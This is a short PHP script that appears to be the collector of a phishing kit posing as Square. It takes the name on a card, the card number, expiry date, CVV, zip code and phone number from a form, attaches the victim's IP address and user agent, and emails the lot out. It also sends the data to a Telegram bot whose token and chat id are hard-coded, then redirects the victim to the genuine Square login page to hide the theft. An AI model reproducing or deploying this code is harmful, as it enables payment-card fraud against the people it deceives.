<?php
if($_POST["cc1"] != "" and $_POST["cc2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message .= "--------------Square CC-----------------------\n";
$message .= "Name on Card            : ".$_POST['cc1']."\n";
$message .= "Card Number           : ".$_POST['cc2']."\n";
$message .= "Expiry           : ".$_POST['cc3']."\n";
$message .= "Cvv           : ".$_POST['cc4']."\n";
$message .= "Zip           : ".$_POST['cc5']."\n";
$message .= "Phone           : ".$_POST['cc6']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- D3R3K --------------|\n";
$subject = "Square CC| ".$_POST['cc1']." | $ip";
include 'email.php';
{
mail("$to", "$send", "$subject", $message);
$token = "941831663:AAEBvTp0DeFlPQlXOnRC6CTv7K2RJTbIJCU";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=652972541&text=" . urlencode($message)."" );     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://squareup.com/login");
}else{
header ("Location: index.php");
}

?>